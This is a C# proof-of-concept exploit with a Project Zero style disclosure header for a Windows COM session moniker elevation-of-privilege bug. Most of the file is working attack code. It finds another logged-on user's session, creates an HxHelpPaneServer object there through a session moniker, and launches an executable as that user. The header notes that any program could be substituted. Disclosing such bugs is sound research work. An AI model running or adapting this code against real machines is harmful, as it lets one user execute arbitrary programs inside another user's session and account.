/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1021

Windows: COM Session Moniker EoP
Platform: Tested on Windows 10 14393, Server 2012 R2
Class: Elevation of Privilege

Summary:
When activating an object using the session moniker the DCOM activator doesn’t check if the current user has permission allowing a user to start an arbitrary process in another logged on user’s session.

Description:

The COM session moniker allows a user to specify the interactive session that’s to be used when a DCOM object is registered with an AppID with RunAs of “Interactive User”. As switching sessions is not something a normal user can do you’d assume that this would be only accessible to administrators (or at least with Impersonate/Assign Primary Token privilege). It turns out however that there’s no such restriction, this allows one user to instantiate a DCOM object inside another user’s session on the same machine (think Terminal Server or Fast User Switching).

The only restriction on the user then accessing that instantiated server is the specified Access DACL. The default Access DACL on a modern system only allows the user identity the server is running as as well as Administrators to access the created object. However there are a number of statically registered servers which allow the interactive user group (and who knows how many dynamically allowed ones through CoInitializeSecurity). I already described one these in my blog post of resurrecting dead processes, HxHelpPaneServer. With this object we can execute an arbitrary process in the context of the other user in their session.

Fortunately at least it's not possible to create an object in Session 0 (as far as I can tell) as that's not an interactive session.

Proof of Concept:

I’ve attached a proof of concept in C#. To test PoC use the following steps.

1) Create two users on the same machine.
2) Log on to both users to ensure account setup has completed. 
3) As one of the users execute the PoC, ensure it prints that it’s going to start a new process. Switch to the other user (without logging out the one running the PoC).
4) After about 20 seconds a copy of notepad should start on the other user’s desktop. Of course this could be any process including an arbitrary executable from the other user.

NOTE: Make sure these user’s are not administrators, or at least are split token administrators. If they’re the Administrator user which doesn’t run by default with a filtered token then the user will not be able to access the DCOM object due to High IL and executing the process will fail. That’s not to say it’s impossible to exploit that scenario, just more difficult.

Expected Result:
Using a session moniker for a session outside the current one should fail if not an administrator.

Actual Result:
DCOM object created in the specified session an arbitrary executable run as that user.
*/

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

namespace PoC_SessionMoniker_EoP
{
    class Program
    {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer
        {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }

        enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,              // User logged on to WinStation
            WTSConnected,           // WinStation connected to client
            WTSConnectQuery,        // In the process of connecting to client
            WTSShadow,              // Shadowing another WinStation
            WTSDisconnected,        // WinStation logged on without client
            WTSIdle,                // Waiting for client to connect
            WTSListen,              // WinStation is listening for connection
            WTSReset,               // WinStation is being reset
            WTSDown,                // WinStation is down due to error
            WTSInit,                // WinStation in initialization
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WTS_SESSION_INFO
        {
            public int SessionId;
            public IntPtr pWinStationName;
            public WTS_CONNECTSTATE_CLASS State;
        }

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSEnumerateSessions(
                IntPtr hServer,
                int Reserved,
                int Version,
                out IntPtr ppSessionInfo,
                out int pCount);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern void WTSFreeMemory(IntPtr memory);

        public static IEnumerable<int> GetSessionIds()
        {
            List<int> sids = new List<int>();
            IntPtr pSessions = IntPtr.Zero;
            int dwSessionCount = 0;
            try
            {
                if (WTSEnumerateSessions(IntPtr.Zero, 0, 1, out pSessions, out dwSessionCount))
                {
                    IntPtr current = pSessions;
                    for (int i = 0; i < dwSessionCount; ++i)
                    {
                        WTS_SESSION_INFO session_info = (WTS_SESSION_INFO)Marshal.PtrToStructure(current, typeof(WTS_SESSION_INFO));
                        
                        if (session_info.State == WTS_CONNECTSTATE_CLASS.WTSActive)
                        {
                            if (session_info.SessionId != 0)
                            {
                                sids.Add(session_info.SessionId);
                            }
                        }
                        current += Marshal.SizeOf(typeof(WTS_SESSION_INFO));
                    }
                }
            }
            finally
            {
                if (pSessions != IntPtr.Zero)
                {
                    WTSFreeMemory(pSessions);
                }
            }

            return sids;
        }

        static void Main(string[] args)
        {
            try
            {
                int current_session_id = Process.GetCurrentProcess().SessionId;
                int new_session_id = 0;
                Console.WriteLine("Waiting For a Target Session");
                while (true)
                {
                    IEnumerable<int> sessions = GetSessionIds().Where(id => id != current_session_id);
                    if (sessions.Count() > 0)
                    {
                        new_session_id = sessions.First();
                        break;
                    }
                    Thread.Sleep(1000);
                }
                
                Console.WriteLine("Creating Process in Session {0} after 20secs", new_session_id);
                Thread.Sleep(20000);
                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
                Uri target = new Uri(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe"));
                server.Execute(target.AbsoluteUri);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
